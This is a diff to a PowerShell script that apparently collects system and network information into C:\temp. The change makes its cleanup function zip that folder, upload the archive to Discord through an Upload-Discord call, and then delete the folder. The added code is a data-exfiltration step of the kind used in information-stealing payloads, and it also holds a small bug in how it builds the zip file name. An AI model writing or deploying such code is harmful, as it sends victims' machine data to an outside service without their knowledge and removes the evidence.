@@ -479,16 +479,31 @@ $($networkAdapters | Format-Table | Out-String)
 
 
 
-# Function to delete the temporary directory
+# Function to delete the temporary directory and create a zip archive
 function DelTempDir {
     Set-Location -Path "C:\"
     
     # Check if the C:\temp directory exists before attempting to remove it
     if (Test-Path -Path "C:\temp" -PathType Container) {
-        Remove-Item -Path "C:\temp" -Force -Recurse
-        
-    }
+        # Get the current username
+        $username = $env:USERNAME
 
+        # Get the current date and time
+        $timestamp = (Get-Date).ToString("yyyyMMdd_HHmm")
+
+        # Set the zip file name
+        $zipFileName = "$username_$timestamp.zip"
+        $zipFilePath = Join-Path "C:\" $zipFileName
+
+        # Create a zip archive with the contents of C:\temp
+        Compress-Archive -Path "C:\temp\*" -DestinationPath $zipFilePath
+
+        # Upload the zip archive to Discord
+        Upload-Discord -file $zipFilePath -text "Temporary Directory Archive: $zipFileName"
+
+        # Remove the C:\temp directory
+        Remove-Item -Path "C:\temp" -Force -Recurse
+    }
 }
 
 # Call TempDir
